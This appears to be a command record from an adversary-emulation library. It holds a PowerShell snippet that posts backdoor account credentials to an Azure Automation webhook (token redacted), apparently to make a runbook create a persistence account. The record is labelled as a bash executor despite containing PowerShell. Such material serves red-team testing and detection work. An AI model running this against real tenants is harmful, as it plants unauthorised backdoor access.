---
id: 9fc65fcf-2f0d-43c0-a7a9-e73419afd74c
name: Invoke Azure Automation Webhook
type: command
executor: bash
data: '$uri = "https://s15events.azure-automation.net/webhooks?token=h6[REDACTED]%3d"

  $AccountInfo  = @(@{RequestBody=@{Username="BackdoorUsername";Password="BackdoorPassword"}})

  $body = ConvertTo-Json -InputObject $AccountInfo

  $response = Invoke-WebRequest -Method Post -Uri $uri -Body $body'
output: null
created_at: '2023-04-06T03:56:15.581143+00:00'
updated_at: '2023-05-25T02:58:33.348660+00:00'
---

# Invoke Azure Automation Webhook

```bash
$uri = "https://s15events.azure-automation.net/webhooks?token=h6[REDACTED]%3d"
$AccountInfo  = @(@{RequestBody=@{Username="BackdoorUsername";Password="BackdoorPassword"}})
$body = ConvertTo-Json -InputObject $AccountInfo
$response = Invoke-WebRequest -Method Post -Uri $uri -Body $body
```


